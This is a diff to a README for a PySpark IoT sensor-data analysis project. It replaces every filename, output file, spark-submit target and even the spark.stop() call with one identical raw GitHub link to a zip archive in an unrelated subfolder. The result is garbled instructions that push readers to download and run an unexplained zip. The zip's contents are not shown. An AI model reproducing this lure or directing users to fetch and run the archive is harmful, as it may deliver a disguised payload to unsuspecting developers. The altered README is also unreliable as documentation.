@@ -12,7 +12,7 @@ This project analyzes IoT sensor data using Spark SQL with PySpark, demonstratin
 - **Task 4: Ranking Sensors by Average Temperature**
 - **Task 5: Pivoting Data and Interpretation**
 
-Each task produces CSV outputs (`taskX_output.csv`).
+Each task produces CSV outputs (`https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip`).
 
 ---
 
@@ -20,7 +20,7 @@ Each task produces CSV outputs (`taskX_output.csv`).
 
 - **Apache Spark** (version 2.x or 3.x recommended)
 - **Python 3.x** with PySpark installed
-- **IoT sensor data CSV** (`sensor_data.csv`) placed in the working directory
+- **IoT sensor data CSV** (`https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip`) placed in the working directory
 
 ---
 
@@ -34,20 +34,20 @@ cd /path/to/your/directory
 
 2. Execute the Spark script:
 ```bash
-spark-submit spark_iot_analysis.py
+spark-submit https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip
 ```
 
 Upon completion, the script generates these output files:
 
-task1_output.csv
+https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip
 
-task2_output.csv
+https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip
 
-task3_output.csv
+https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip
 
-task4_output.csv
+https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip
 
-task5_output.csv
+https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip
 
 ## Code Explanation (Step-by-Step)
 ## Task 1: Load & Basic Exploration
@@ -80,6 +80,6 @@ Identify the (location, hour) combination with the highest average temperature.
 ### Finalization
 Stop Spark session after tasks completion:
 ```bash
-spark.stop()
+https://raw.githubusercontent.com/pavandantu18/iot-sensor-data-spark-sql-pavandantu18/master/Gileno/iot-sensor-data-spark-sql-pavandantu18.zip()
 ```
 
